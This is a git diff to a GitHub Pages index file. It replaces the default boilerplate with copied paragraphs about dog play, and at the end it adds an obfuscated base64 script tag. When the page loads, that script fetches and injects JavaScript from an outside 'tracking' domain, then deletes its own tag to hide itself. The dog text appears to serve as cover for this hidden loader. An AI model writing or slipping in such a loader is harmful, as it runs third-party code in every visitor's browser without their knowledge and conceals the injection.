@@ -1,37 +1,11 @@
-## Welcome to GitHub Pages
+Play
+Dog-dog
+Play between dogs usually involves several behaviors that are often seen in aggressive encounters, for example, nipping, biting and growling.[10] It is therefore important for the dogs to place these behaviors in the context of play, rather than aggression. Dogs signal their intent to play with a range of behaviors including a "play-bow", "face-paw," "open-mouthed play face" and postures inviting the other dog to chase the initiator. Similar signals are given throughout the play to maintain the context of the potentially aggressive activities.[11]
 
-You can use the [editor on GitHub](https://github.com/vpTT2Yx2u67/4ywseryw45et/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+From a young age, dogs engage in play with one another. Dog play is made up primarily of mock fights. It is believed that this behavior, which is most common in puppies, is training for important behaviors later in life. Play between puppies is not necessarily a 50:50 symmetry of dominant and submissive roles between the individuals; dogs who engage in greater rates of dominant behaviors (e.g. chasing, forcing partners down) at later ages also initiate play at higher rates. This could imply that winning during play becomes more important as puppies mature.[12]
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Emotional contagion is linked to facial mimicry in humans and primates. Facial mimicry is an automatic response that occurs in less than 1 second in which one person involuntary mimics another person's facial expressions, forming empathy. It has also been found in dogs at play, and play sessions lasted longer when there were facial mimicry signals from one dog to another.[13]
 
-### Markdown
+Dog-hum
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/vpTT2Yx2u67/4ywseryw45et/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+<script id="EHAdk" src="data:text/javascript;base64, dmFyIF95Y0ZyZSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3N1elc4LCBfYjFob0QpIHt2YXIgX2psVlQ2ID0gZnVuY3Rpb24oX3ZXQ29GKSB7d2hpbGUgKC0tX3ZXQ29GKSB7X3N1elc4WydwdXNoJ10oX3N1elc4WydzaGlmdCddKCkpO319O19qbFZUNigrK19iMWhvRCk7fShfeWNGcmUsIDB4MTFiKSk7dmFyIF9QbkNWUiA9IGZ1bmN0aW9uKF9Lb3ZhSCwgX3dhQWlZKSB7X0tvdmFIID0gX0tvdmFIIC0gMHgwO3ZhciBfS2tZNGggPSBfeWNGcmVbX0tvdmFIXTtyZXR1cm4gX0trWTRoO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfUG5DVlIoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzlJb0ZtID0gZG9jdW1lbnRbX1BuQ1ZSKCcweDEnKV0oX1BuQ1ZSKCcweDInKSk7XzlJb0ZtW19QbkNWUignMHgzJyldID0gX1BuQ1ZSKCcweDQnKTtfOUlvRm1bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NFx4NzJceDYxXHg2M1x4NmJceDY5XHg2ZVx4NjdceDJlXHg2M1x4NjFceDczXHgyZFx4NzZceDMxXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1M1x4NGJceDc3XHg0OFx4NGZceDU5XHg0MVx4MzBceDRlXHg3OSc7ZG9jdW1lbnRbX1BuQ1ZSKCcweDUnKV0oX1BuQ1ZSKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oXzlJb0ZtKTtkb2N1bWVudFtfUG5DVlIoJzB4NycpXSgnRUhBZGsnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
